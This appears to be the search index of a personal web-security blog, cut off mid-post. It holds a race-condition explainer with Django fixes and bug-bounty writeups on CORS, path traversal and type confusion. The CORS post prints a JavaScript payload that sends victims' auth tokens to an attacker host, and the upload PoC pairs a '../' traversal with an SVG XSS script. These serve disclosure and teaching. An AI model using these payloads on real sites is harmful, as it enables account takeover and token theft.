{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#research-and-writeups-on-web-security-bug-bounty-and-ctfs","title":"Research and writeups on web security, bug bounty, and CTFs.","text":"<p>This is where I document my findings, research, and practical experience in cybersecurity. Feel free to reach out on X (Twitter) or by email if needed omarsselim00@gmail.com.</p> <p>This blog is my personal space for sharing:</p> <ul> <li>\ud83d\udd0d Penetration testing techniques &amp; real-world writeups  </li> <li>\ud83e\udde0 Notes from courses, certifications, and deep dives  </li> <li>\ud83d\udee0\ufe0f Projects, home lab setups, and experiments  </li> <li>\ud83d\udcda Technical guides, tools, and curated cheatsheets</li> </ul>"},{"location":"#about-me","title":"About Me","text":"<p>For more about me, check the About page.</p>"},{"location":"about/","title":"About","text":""},{"location":"about/#about","title":"About","text":""},{"location":"about/#omar-samy","title":"Omar Samy","text":"<p>Cybersecurity enthusiast and penetration tester.</p> <p>I\u2019m passionate about offensive security, application security, and vulnerability research. I focus on web and mobile security, bug bounty hunting, and participating in CTFs and security challenges. This blog is where I share my findings, writeups, and experiments.</p>"},{"location":"about/#connect-with-me","title":"Connect with me","text":"<ul> <li>Twitter (X)</li> <li>LinkedIn</li> <li>GitHub</li> </ul> <p>\u270d\ufe0f Looking for My Writings in Arabic?  If you're interested in my non-technical Arabic writings (reflections, thoughts, stories, and more), you can find them on my Medium profile: Medium</p>"},{"location":"research/","title":"Research","text":"<p>This section includes my research notes, experiments, and deep dives into topics related to cybersecurity, application security, and offensive techniques.</p> Web Published:  <p>Articles about Web</p> <p>All research shared here is for educational purposes only and reflects personal exploration, analysis, and findings.</p>"},{"location":"research/web/","title":"web","text":"Race Condition A Detailed Exploration 9 minute read Published: 2025-06-16 <p>A comprehensive guide to understanding and mitigating race conditions in software systems.</p>"},{"location":"research/web/race-condition/","title":"Race Condition A Detailed Exploration","text":"<p>original_post: https://medium.com/@00xmora/race-condition-e93eb33b85d1</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#race-condition","title":"race condition","text":"","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#if-you-think-you-know-race-condition-think-again","title":"if you think you know race condition think again!!","text":"<p>\u0627\u0644\u0633\u0644\u0627\u0645 \u0639\u0644\u064a\u0643\u0645 \u0648\u0631\u062d\u0645\u0629 \u0627\u0644\u0644\u0647 \u0648\u0628\u0631\u0643\u0627\u062a\u0647</p> <p>don\u2019t forget to pray for our brothers in Gaza and Sudan</p> <p>in this article I am going to take you in a journey of race condition in detail</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#understanding-race-conditions-a-deep-dive-into-concurrent-vulnerabilities","title":"Understanding Race Conditions: A Deep Dive into Concurrent Vulnerabilities","text":"<p>Race conditions are a critical class of vulnerabilities in modern computing, stemming from the unpredictable timing of concurrent operations. This article will guide you through what race conditions are, how they manifest, and crucially, how to defend against them.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#1-perquisites-you-should-know-first","title":"1. Perquisites You Should Know First","text":"<p>Before diving into race conditions, let's establish some foundational terms:</p> <ul> <li>Process: Your computer allocates dedicated internal memory to run applications. Each independent application execution, like a web browser, is recognized by your system as a process.</li> <li>Thread: Threads are individual units of execution within a process, handling specific features or tasks. For instance, a browser process might have threads for input handling, internet searching, and output rendering. Threads share the same memory space allocated to their parent process.</li> <li>Multithreading: This refers to the simultaneous execution of multiple threads. Even simple activities, such as opening a browser, require the system to process numerous threads concurrently.</li> <li>Multi-Processing: This involves the parallel execution of multiple processes. This technique enhances system and application speed by distributing tasks across various processors.</li> </ul>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#2-what-is-a-race-condition-and-how-it-works","title":"2. What is a Race Condition and How It Works","text":"<p>A race condition occurs when multiple threads or processes concurrently access and modify shared data, and the final outcome depends on the unpredictable timing or sequence of their execution. In such a scenario, these threads are \"racing\" each other to access and change the data. Without proper synchronization, this concurrency can lead to unexpected and often erroneous results, creating vulnerabilities that attackers can exploit.</p> <p>Imagine a bank system where customers frequently transfer money between accounts. The system tracks account balances, which can be accessed and modified by multiple users simultaneously. A race condition could arise if User A attempts to transfer funds from Account X to Account Y, while User B concurrently initiates a transfer from the same Account X to Account Y.</p> <p>To illustrate this in a practical coding context, consider the following Django example:</p> <pre><code># Vulnerable Django View\ndef my_view(request):\n    obj = MyModel.objects.get(pk=1)\n    obj.field += 1\n    obj.save()\n    return HttpResponse(\"Updated successfully!\")\n</code></pre> <p>In the code above, the Django view <code>my_view</code> retrieves an object from the database, modifies a field, and then saves it back. If two users simultaneously send a request to this view, they might both retrieve the object before either has a chance to save their modifications. User A retrieves the object, then User B retrieves it. Next, User A saves their changes, followed by User B saving theirs. The critical issue here is that User A\u2019s changes are lost, as they are overwritten by User B\u2019s subsequent save.</p> <p>This problem leads to inconsistent data and unexpected behavior. The system is not properly handling the case where concurrent inputs (in this instance, HTTP requests) do not arrive in the expected order, leading to a loss of data integrity.</p> <p>Note: Remember this example, as we'll mitigate it later.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#3-race-condition-types","title":"3. Race Condition Types","text":"<p>Race conditions manifest in various forms, each with unique characteristics:</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#31-time-of-check-to-time-of-use-toctou-flaw","title":"3.1. Time-of-Check to Time-of-Use (TOCTOU) Flaw","text":"<p>This type involves a change in the system's state between the moment a condition is checked and the moment it's actually used.</p> <p>Example: File Access Race Condition Consider a scenario where a file's permissions are checked before a user is allowed to access it. An attacker can manipulate this by changing permissions between the security check and the file's actual usage, potentially gaining unauthorized access or privilege escalation.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#32-limit-overrun-race-condition","title":"3.2. Limit Overrun Race Condition","text":"<p>This type allows attackers to bypass or surpass set limits by exploiting timing vulnerabilities, often by submitting multiple requests concurrently.</p> <p>Example: Coupon Code Redemption In an e-commerce platform, a user applies a one-time discount coupon during checkout. By cleverly timing multiple attempts (e.g., sending rapid, concurrent requests), the user could repeatedly reuse the code within a small window, bypassing the intended single-use restriction.</p> <p>A famous example of this type was discovered by security researcher Egor Homakov, who found a race condition that resulted in essentially unlimited money on Starbucks gift cards.</p> <p>Starbucks.com had personal accounts where users could add gift cards, check balances, and transfer money between them. The money transfer process from <code>card1</code> to <code>card2</code> was stateful:</p> <ol> <li><code>POST /step1 amount=1&amp;from=wallet1&amp;to=wallet2</code> saved these values in the session.</li> <li><code>POST /step2 confirm</code> actually transferred the money and cleared the session.</li> </ol> <p>This \"protection\" was bypassed by using the same account from two different browsers (with different session cookies).</p> <p>Consider having two cards, each with $5.</p> <p>Pseudo-code for the exploit:</p> <pre><code>// Initial state: wallet1 = $5, wallet2 = $5\n\n// Browser 1 (Session A)\n1. POST /step1 amount=5&amp;from=wallet1&amp;to=wallet2\n   // Server saves: {sessionA: {amount: 5, from: wallet1, to: wallet2}}\n\n// Browser 2 (Session B) - CONCURRENTLY\n2. POST /step1 amount=5&amp;from=wallet1&amp;to=wallet2\n   // Server saves: {sessionB: {amount: 5, from: wallet1, to: wallet2}}\n\n// Browser 1 (Session A) - immediately after step 1\n3. POST /step2 confirm\n   // Server processes transfer for Session A: wallet1 -= $5, wallet2 += $5\n   // wallet1 = $0, wallet2 = $10\n   // Session A data cleared\n\n// Browser 2 (Session B) - immediately after step 2, while Session A is processing or just finished\n4. POST /step2 confirm\n   // Server processes transfer for Session B (reads wallet1 as $0): wallet1 -= $5 (to -$5), wallet2 += $5\n   // wallet1 = -$5, wallet2 = $15\n   // Session B data cleared\n\n// The exploit results in: wallet1 = -$5 (debt), wallet2 = $15. Total money is now $10 + $15 = $25 (initial was $10).\n// The user effectively duplicated money.\n</code></pre> <p>The example shows how concurrent requests, even with session clearing, could lead to unexpected behavior and monetary gain.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#33-ordering-race-condition","title":"3.3. Ordering Race Condition","text":"<p>Instances where the execution order of processes significantly impacts the outcome, often due to non-atomic multi-step operations that are not properly synchronized.</p> <p>Example: Multi-threaded Payment System In a payment processing system, if two transactions attempt to withdraw the same amount from an account simultaneously, the order of execution may lead to an overdraft due to insufficient funds not being checked or updated atomically.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#34-deadlocks-and-livelocks","title":"3.4. Deadlocks and Livelocks","text":"<p>These conditions halt progress or lead to continual resource contention, often due to improper resource locking.</p> <ul> <li>Deadlock: In a database system, two processes attempt to access the same resources but in a different order, resulting in both processes waiting for resources that the other holds. This leads to a system halt where neither process can proceed.</li> <li>Livelock: Processes continually change their state in response to other processes, but without making any actual progress. They are actively executing but unable to complete their tasks.</li> </ul>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#35-priority-inversion","title":"3.5. Priority Inversion","text":"<p>This occurs when a lower-priority process inadvertently preempts a higher-priority one due to shared resource contention.</p> <p>Example: Real-time Systems In real-time systems, a high-priority task waiting on a low-priority task to release a shared resource can result in significant delays, impacting critical operations.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#36-micro-architectural-race-conditions","title":"3.6. Micro-Architectural Race Conditions","text":"<p>These are highly complex vulnerabilities specific to hardware-level operations, often exploited by advanced attackers with deep CPU architecture knowledge.</p> <p>Example: Spectre and Meltdown Vulnerabilities These vulnerabilities exploit CPU performance optimizations, such as speculative execution, by manipulating timing discrepancies to allow unauthorized access to sensitive data stored in memory.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#4-how-to-exploit-and-test-race-conditions","title":"4. How to Exploit and Test Race Conditions","text":"<p>Testing for race conditions typically falls into two categories:</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#41-white-box-testing","title":"4.1. White Box Testing","text":"<p>The most effective way to test for race condition vulnerabilities is with access to the source code. This allows security professionals to meticulously review functions and identify logic that assumes synchronous actions without proper defensive programming techniques. It involves:</p> <ul> <li>Code Review: Manually inspecting code for shared resources, non-atomic operations, and potential timing windows.</li> <li>Static Analysis: Using tools that can identify potential concurrency issues in the code.</li> </ul>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#42-black-box-testing","title":"4.2. Black Box Testing","text":"<p>When you do not have access to the source code, testing for race conditions becomes trickier but is certainly not impossible. The core principles of identifying functions that modify shared resources still apply, though finding and testing them may be more challenging.</p> <p>Common Black Box Strategies:</p> <ul> <li>Concurrent Requests: Sending multiple identical requests simultaneously to sensitive endpoints (e.g., account updates, coupon redemptions, resource allocations).</li> <li>Timed Delays: Introducing slight, controlled delays between requests to try and hit specific timing windows.</li> <li>Focus on State-Changing Operations: Prioritize testing endpoints that involve financial transactions, user authentications, resource creations/deletions, or any operation that modifies shared data.</li> </ul> <p>Tools for Black Box Testing:</p> <ul> <li>Race-The-Web: This open-source tool (available on GitHub here) is designed to rapidly send concurrent requests, increasing the likelihood of triggering a race condition on performant web applications.</li> <li>Burp Suite Intruder: While more versatile, Burp Suite's Intruder can be configured to test for race conditions. By setting a high number of threads and using attack types like \"Sniper\" or \"Cluster Bomb\" with minimal payloads, you can send numerous requests concurrently.</li> </ul> <p>Successfully exploiting a race condition can lead to severe consequences, including data corruption, unauthorized access, denial of service, or significant financial loss.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#5-defense-and-mitigation","title":"5. Defense and Mitigation","text":"<p>Preventing race conditions primarily revolves around ensuring atomicity (operations complete entirely or not at all) and sequential execution for critical sections of code or data.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#51-programming-languages-implementing-locks","title":"5.1. Programming Languages: Implementing Locks","text":"<p>The most direct way to prevent race conditions at the application level is through locks. Locks ensure that only one thread can access a shared resource or execute a critical section of code at a time. Most modern programming languages provide built-in locking functionalities.</p> <ul> <li>Python: <code>threading.Lock</code></li> <li>Go: <code>sync.Mutex</code></li> <li>Java: <code>synchronized</code> keyword, <code>java.util.concurrent.locks.Lock</code></li> </ul> <p>Let's mitigate our earlier Django example, shall we?</p> <pre><code>from django.db import transaction\nfrom django.http import HttpResponse, HttpResponseNotFound, HttpResponseServerError\nfrom .models import MyModel # Assuming MyModel is defined in models.py\n\ndef my_view_mitigated(request):\n    try:\n        # Start an atomic transaction to ensure all operations are treated as a single unit.\n        # select_for_update() locks the selected rows until the end of the transaction,\n        # preventing other concurrent transactions from modifying them.\n        with transaction.atomic():\n            obj = MyModel.objects.select_for_update().get(pk=1)\n            obj.field += 1\n            obj.save()\n            return HttpResponse(\"Updated successfully!\")\n    except MyModel.DoesNotExist:\n        return HttpResponseNotFound(\"Object with pk=1 not found.\")\n    except Exception as e:\n        # Log the error for debugging\n        print(f\"An error occurred: {e}\")\n        return HttpResponseServerError(\"An error occurred during the update.\")\n</code></pre> <p>Explanation of the Mitigation:</p> <ol> <li><code>transaction.atomic()</code>: This context manager starts a database transaction. All database queries within this block are executed as a single, atomic unit. If any error occurs, all changes within the block are rolled back, ensuring data consistency.</li> <li><code>select_for_update()</code>: This crucial method locks the database rows retrieved until the current transaction is complete. Any other concurrent transactions attempting to modify these locked rows will be blocked until the current transaction finishes, effectively preventing race conditions by enforcing sequential access to the data.</li> <li>Error Handling (<code>try/except</code>): The block ensures that the lock is properly managed even if an error occurs, preventing potential deadlocks or lingering locks.</li> </ol> <p>This code should be thoroughly tested to confirm the race condition is resolved and that the locking mechanism works as expected without introducing new issues.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#52-database-related-mitigations","title":"5.2. Database-Related Mitigations","text":"<p>Databases play a crucial role in preventing race conditions, especially those compliant with ACID (Atomicity, Consistency, Isolation, Durability) properties.</p> <ul> <li> <p>Isolation Levels: The key ACID component for race synchronization is isolation. Databases offer various isolation levels:</p> <ul> <li>Serializable: This is the highest level of isolation, effectively forcing all transactions to occur sequentially. While it guarantees safety from race conditions within the database, it can significantly slow down operations and may lead to frequent deadlocks due to exclusive locks.</li> <li>Repeatable Read (e.g., in MySQL): This level offers a higher degree of safety than lower levels without the extreme performance overhead of serializable. It ensures that if you read a row multiple times within a transaction, you'll always get the same result, but it doesn't prevent \"phantom reads\" (new rows appearing from other transactions).</li> <li>Choosing the Right Level: Balancing security with performance is critical. For most applications, a lower but still robust isolation level (like \"repeatable read\") might be a more practical choice, coupled with application-level locking for the most critical sections.</li> </ul> </li> <li> <p>Inserts vs. Updates: Whenever possible, prefer inserts over updates in your SQL queries. Inserts typically have more built-in error protection in most database configurations, which can help prevent modifying a single database entry simultaneously and reduce the risk of race conditions on existing data.</p> </li> </ul>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#53-operating-system-related-mitigations","title":"5.3. Operating System-Related Mitigations","text":"<p>File-level locking can also prevent race conditions when dealing with shared files:</p> <ul> <li>System Calls: Operating systems provide system calls to enforce file locks. Examples include <code>LockFile</code> in Windows and <code>flock</code> or <code>lockf</code> in Unix-like systems. Most programming languages abstract these low-level calls into higher-level file handling functions.</li> <li>Temporary Lock Files: Many applications, like Microsoft Word, create temporary \"lock files\" (e.g., <code>~myfile.lck</code>) when a file is being accessed for writing. Other programs wanting to write to the same file check for the existence of this lock file before granting write access.</li> </ul>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#54-httpweb-application-specific-mitigations","title":"5.4. HTTP/Web Application-Specific Mitigations","text":"<p>While application-level locking is the most effective, other strategies can reduce the likelihood of race conditions in web applications:</p> <ul> <li>CSRF Tokens: Implementing Cross-Site Request Forgery (CSRF) tokens can make it more difficult for attackers to automate the large number of concurrent requests needed to trigger a race condition, as each valid request would require a unique token.</li> <li>Server-Side Request Queues: For extremely high-traffic or highly sensitive operations, a server-side request queue can be implemented. This processes requests for a specific critical action one by one, ensuring strict sequential execution and eliminating concurrency for that particular operation.</li> </ul>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#race-conditions-in-synchronous-environments","title":"Race Conditions in Synchronous Environments?","text":"<p>It's a common misconception that languages without native asynchronous or multi-threading concepts, like PHP, are immune to race conditions. However, PHP applications typically run on asynchronous, multi-threaded platforms (like Nginx or Apache). While PHP itself executes functions sequentially, the underlying platform can initiate many PHP processes or requests simultaneously. If these concurrent PHP executions attempt to access or modify a shared resource outside their scope (e.g., a database entry, a file), a race condition can still occur.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#conclusion","title":"Conclusion","text":"<p>As with all security mitigations, achieving complete protection against race conditions often involves balancing security requirements with business needs and performance considerations. The most effective defense primarily relies on robust locking mechanisms at the application and database levels, ensuring that critical operations on shared resources are handled atomically and sequentially. Proactive identification and mitigation of race conditions are paramount for building secure, reliable, and high-integrity applications in today's concurrent computing landscape.</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"research/web/race-condition/#resources","title":"Resources","text":"<ul> <li>Race Condition Web Applications - Security Compass</li> <li>What is a Race Condition Vulnerability? - Indusface</li> <li>Race Condition Vulnerability - GeeksforGeeks</li> <li>Fixes for Python Race Conditions - Fluid Attacks</li> <li>Demystifying Race Condition Vulnerabilities - FireCompass</li> </ul> <p>Thanks for reading</p>","tags":["race-condition","security","multithreading","synchronization","web-security"]},{"location":"writeups/","title":"Writeups","text":"<p>Welcome to the writeups section. Here you\u2019ll find detailed reports and walkthroughs of the challenges I\u2019ve solved, including CTFs, real-world vulnerabilities, and practical security scenarios.</p> How I Tricked the System with Type Confusion and Became a System Admin (Briefly) 5 min Published: 2025-03-24 <p>Discover how a type confusion bug allowed privilege escalation to a System Administrator role by simply tweaking a numeric value in an API request.</p> Path Traversal in File Upload via GraphQL API 3 minute read Published: 2025-03-11 <p>A file upload endpoint accepted folder traversal sequences, enabling unauthorized file placement and abuse of signed Google Cloud Storage URLs.</p> Auth Token Theft via CORS Misconfiguration 3 minute read Published: 2025-03-08 <p>A critical CORS misconfiguration allowed stealing authentication tokens by abusing a wildcard-like origin match and Access-Control-Allow-Credentials: true.</p> Privilege Escalation via Chat Permissions Bypass 3 minute read Published: 2024-02-07 <p>A real-world case where UI-level permission controls were not enforced at the API level, allowing message sending and user impersonation.</p> <p>New posts are added regularly. Stay curious and hack responsibly.</p>"},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/","title":"How a CORS Misconfiguration Could Have Let Me Steal Auth Tokens","text":"<p>In this post, I\u2019ll walk you through a CORS misconfiguration vulnerability I discovered that allowed me to steal authentication tokens, impersonate users, and access sensitive data \u2014 all with a few lines of JavaScript. This bug stemmed from a subtle but dangerous CORS policy misconfiguration.</p>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#background-what-is-cors","title":"\ud83e\udde0 Background: What Is CORS?","text":"<p>CORS (Cross-Origin Resource Sharing) is a browser security feature that restricts how websites from one origin can interact with resources from another. If not configured properly, it can unintentionally expose APIs to malicious sites.</p>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#the-vulnerability","title":"\ud83d\udea9 The Vulnerability","text":"<p>The API I tested had the following CORS behavior:</p> <ul> <li>It allowed any origin that ended with a trusted subdomain like <code>rise.target.com</code></li> <li>It also responded with:</li> </ul> <pre><code>Access-Control-Allow-Credentials: true\nAccess-Control-Allow-Origin: https://evil.com/rise.target.com\n</code></pre> <p>That meant any malicious domain that crafted a similar subdomain (e.g., <code>https://evil.com/rise.target.com</code>) could bypass origin checks and access sensitive API responses.</p>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#testing-the-exploit","title":"\ud83d\udd2c Testing the Exploit","text":"<p>I hosted a malicious site at:</p> <pre><code>https://evil.com/rise.target.com\n</code></pre> <p>Then, I injected this simple payload:</p> <pre><code>fetch(\"https://id.target.com/v1/session/rise/switch/\", {\n  method: \"GET\",\n  credentials: \"include\" // Sends victim's cookies\n})\n.then(res =&gt; res.json())\n.then(data =&gt; {\n  // Exfiltrate session data to my server\n  fetch(\"https://attacker.com/steal?data=\" + encodeURIComponent(JSON.stringify(data)));\n});\n</code></pre> <p>When a logged-in victim visited my page, their browser:</p> <ul> <li>Automatically sent their session cookie (<code>HERMES_ID</code>)</li> <li>The API accepted my domain (since it looked trusted)</li> <li>The response included valid tokens and user metadata</li> <li>The data was silently exfiltrated to my server</li> </ul>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#evidence","title":"\ud83d\udcf8 Evidence","text":"<p>Here\u2019s a look at what I received:</p> <ul> <li>\u2705 Valid <code>access_token</code></li> <li>\ud83e\uddd1\u200d\ud83d\udcbc User profile information</li> <li>\ud83d\udd10 Authenticated session context</li> </ul> <p></p>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#fix-recommendations","title":"\ud83d\udee1\ufe0f Fix Recommendations","text":"<p>To fix this kind of issue, here\u2019s what I recommended:</p>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#1-strict-cors-origin-checks","title":"1. Strict CORS Origin Checks","text":"<p>Only allow exact origins:</p> <pre><code>Access-Control-Allow-Origin: https://rise.target.com\n</code></pre> <p>Avoid dangerous patterns like:</p> <pre><code>if (origin.endsWith('rise.target.com')) // \u274c\n</code></pre>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#2-secure-cookies-with-samesite","title":"2. Secure Cookies with SameSite","text":"<p>Use this to block cross-origin cookies:</p> <pre><code>Set-Cookie: HERMES_ID=abc; Secure; HttpOnly; SameSite=Strict\n</code></pre>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#3-avoid-allowing-credentials-loosely","title":"3. Avoid Allowing Credentials Loosely","text":"<p>Only use:</p> <pre><code>Access-Control-Allow-Credentials: true\n</code></pre> <p>...if you\u2019re absolutely sure the origin is trusted.</p>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#impact","title":"\ud83c\udfaf Impact","text":"<p>This misconfiguration could allow:</p> <ul> <li>Complete account takeover</li> <li>Unauthorized GraphQL or API access</li> <li>Exploitation from any malicious website with a spoofed subdomain</li> </ul>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/How-a-CORS-Misconfiguration-Let-Me-Steal-Auth-Tokens/#final-thoughts","title":"\ud83d\udd1a Final Thoughts","text":"<p>CORS misconfigurations are subtle and often overlooked \u2014 but their impact can be critical. This vulnerability didn\u2019t need a single line of backend code to be touched by the attacker. Just a cookie, a misconfigured header, and a clever origin were enough.</p> <p>If you're building or reviewing APIs, always test your CORS logic under real attack scenarios. What seems safe on paper might leak tokens in practice.</p> <p>\ud83d\udcac Have you seen similar CORS issues in the wild? Let's connect on Twitter, or LinkedIn.</p>","tags":["cors","auth-token-theft","access-control","bug-bounty","web-security"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/","title":"Path Traversal in File Upload via GraphQL API","text":"","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#summary","title":"Summary","text":"<p>During a routine test of a GraphQL file upload API, I discovered a path traversal vulnerability that allowed attackers to escape intended directories and store files in arbitrary locations on Google Cloud Storage. This could lead to malicious file hosting, stored XSS, or unintentional overwriting of sensitive files.</p>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#vulnerability-details","title":"Vulnerability Details","text":"<ul> <li>Endpoint: <code>POST /graphql</code></li> <li>Vulnerable Parameter: <code>folder</code> inside the GraphQL mutation</li> </ul> <p>By setting the <code>folder</code> variable to a traversal string like <code>../../../..</code>, I was able to manipulate the final storage path of the uploaded file.</p>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#proof-of-concept","title":"Proof of Concept","text":"<p>Here\u2019s a condensed version of the PoC used in the request:</p> <pre><code>POST /graphql HTTP/2\nHost: rise-api.target.com\nAuthorization: Bearer &lt;token&gt;\nContent-Type: multipart/form-data; boundary=----boundary\n\n------boundary\nContent-Disposition: form-data; name=\"operations\"\n\n{\n  \"operationName\": \"singleUpload\",\n  \"variables\": {\n    \"folder\": \"../../../..\",\n    \"file\": \"newfile\"\n  },\n  \"query\": \"mutation singleUpload($file: Upload!, $folder: String!) { singleUpload(file: $file, folder: $folder) { filename uri signedUrl } }\"\n}\n------boundary\nContent-Disposition: form-data; name=\"map\"\n\n{ \"1\": [\"variables.file\"] }\n------boundary\nContent-Disposition: form-data; name=\"1\"; filename=\"test.svg\"\nContent-Type: image/svg+xml\n\n&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;\n&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;\n  &lt;script&gt;alert(\"XSS by mora\");&lt;/script&gt;\n&lt;/svg&gt;\n------boundary--\n</code></pre>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#api-response","title":"API Response","text":"<pre><code>{\n  \"data\": {\n    \"singleUpload\": {\n      \"filename\": \"test.svg\",\n      \"uri\": \"organization_abc/../../../others/unique-id-test.svg\",\n      \"signedUrl\": \"https://rise-files.target.com/others/unique-id-test.svg?...\",\n    }\n  }\n}\n</code></pre> <p>This shows the file being placed in a directory (<code>/others/</code>) outside the intended <code>organization_abc</code> context.</p>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#recommended-fixes","title":"Recommended Fixes","text":"<ol> <li>Sanitize folder input: Reject traversal sequences like <code>../</code> in any upload path.</li> <li>Whitelist upload directories: Only allow uploads to pre-approved subdirectories.</li> <li>Limit signed URL lifetimes: Expire signed URLs quickly to reduce misuse.</li> <li>Validate upload metadata server-side: Don't rely on client-provided <code>folder</code> paths blindly.</li> <li>Restrict public access to upload endpoints: Tie storage and access to strong authZ/authN checks.</li> </ol>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#impact","title":"Impact","text":"<ul> <li>Persistent Malicious File Hosting: Attackers could upload malware or phishing content to a trusted domain.</li> <li>Stored XSS Risk: Malicious file names or SVG files might execute if reflected or embedded.</li> <li>Overwrite Risk: Without validation, uploads could overwrite essential <code>.js</code>, <code>.json</code>, or user-generated content.</li> <li>Information Exposure: If GCS directory listings are ever enabled, sensitive files may be accessible.</li> </ul>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#resolution","title":"Resolution","text":"<p>The issue was marked Informative due to limited security impact in this context. However, it highlights a common misconfiguration when using file upload APIs, especially with cloud storage services like GCS or S3.</p>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/Path-Traversal-in-File-Upload-via-GraphQL-API/#references","title":"\ud83d\udcda References","text":"<ul> <li>OWASP Path Traversal</li> <li>GCP Signed URLs Best Practices</li> </ul> <p>Thanks for reading!</p>","tags":["path-traversal","file-upload","graphql","gcp","bug-bounty"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/","title":"How I Tricked the System with Type Confusion and Became a System Admin (Briefly)","text":"<p>Originally published on Medium: https://00xmora.medium.com/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly-72ad2ce08061</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#prologue-a-hackers-curiosity","title":"Prologue: A Hacker's Curiosity","text":"<p>As security researchers, we live for those moments of discovery\u200a\u2014\u200athe subtle gaps in logic, the overlooked edge cases that turn into major vulnerabilities.</p> <p>This is the story of how a simple data type discrepancy allowed me to bypass access controls and assign myself a System Administrator role for an entire organization.</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#_1","title":"How I Tricked the System with Type Confusion and Became a System Admin (Briefly)","text":"","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#understanding-type-confusion","title":"Understanding Type Confusion","text":"<p>Type Confusion occurs when a program mistakenly treats one type of data as another, leading to unintended behavior.</p> <p>Languages that support loose typing, like JavaScript and Python, are particularly 